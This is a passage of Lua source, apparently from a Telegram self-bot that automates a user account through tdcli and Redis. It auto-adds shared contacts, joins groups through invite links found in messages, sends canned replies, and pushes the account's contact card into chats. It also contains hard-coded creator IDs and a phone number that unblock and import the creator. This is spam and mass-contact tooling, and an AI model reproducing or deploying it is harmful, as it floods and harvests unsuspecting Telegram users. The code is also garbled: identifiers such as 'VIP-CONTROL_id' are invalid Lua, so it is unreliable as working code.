        }, dl_cb, nil)
      end
    end
    msg.chat_type_ = chat_type(msg.chat_id_)
    proc_pv(msg)
    if not msg.content_.text_ then
      if msg.content_.caption_ then
        msg.content_.text_ = msg.content_.caption_
      else
        msg.content_.text_ = nil
      end
    end
    local text_ = msg.content_.text_
    if not redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":botinfo") then
      tdcli_function({ID = "GetMe"}, our_id, nil)
    end
    local botinfo = JSON.decode(redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":botinfo"))
    our_id = botinfo.id_
    if msg.content_.ID == "MessageText" then
      local result = process(msg)
      if result then
        if redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":typing") then
          tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
        end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, result, 1, "html")
      end
      process_links(text_)
      if redis:sismember("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":الردودlist", msg.content_.text_) then
        if msg.sender_user_id_ ~= our_id then
          local answer = redis:hget("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":الردود", msg.content_.text_)
          if redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
          end
          if redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":autochat") then
            tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "html")
          end
        end
        if redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":markread") then
          return tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
        end
      end
    elseif msg.content_.ID == "MessageContact" then
      local first = msg.content_.contact_.first_name_ or "-"
      local last = msg.content_.contact_.last_name_ or "-"
      local phone = msg.content_.contact_.phone_number_
      local id = msg.content_.contact_.user_id_
      if not redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":notaddcontacts") then
        tdcli.add_contact(phone, first, last, id)
      end
      if redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
      end
      if redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":addedmsg") then
        local answer = redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":addedmsgtext") or [[
Addi
Bia pv]]
        if redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":typing") then
          tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
        end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
      end
      if redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":addedcontact") and msg.sender_user_id_ ~= our_id then
        return tdcli.sendContact(msg.chat_id_, msg.id_, 0, 0, nil, botinfo.phone_number_, botinfo.first_name_, botinfo.last_name_, botinfo.id_)
      end
    elseif msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
      return rem(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
      return add(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatAddMembers" then
      for i = 0, #msg.content_.members_ do
        if msg.content_.members_[i].id_ == our_id then
          add(msg.chat_id_)
          break
        end
      end
    elseif msg.content_.caption_ then
      if redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
      end
      return process_links(msg.content_.caption_)
    end
  elseif data.ID == "UpdateChat" then
    if data.chat_.id_ == 11111111 then
      tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
    elseif data.chat_id_ == 11111111 then
      tdcli.unblockUser(data.chat_.id_)
    elseif data.chat_.id == 353581089 then
      tdcli.unblockUser(data.chat_.id_)
      tdcli.importContacts(989213985504, "Creator", "", data.chat_.id)
    end
    return add(data.chat_.id_)
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli.getChats("9223372036854775807", 0, 20)
  end
end
return {update = update}
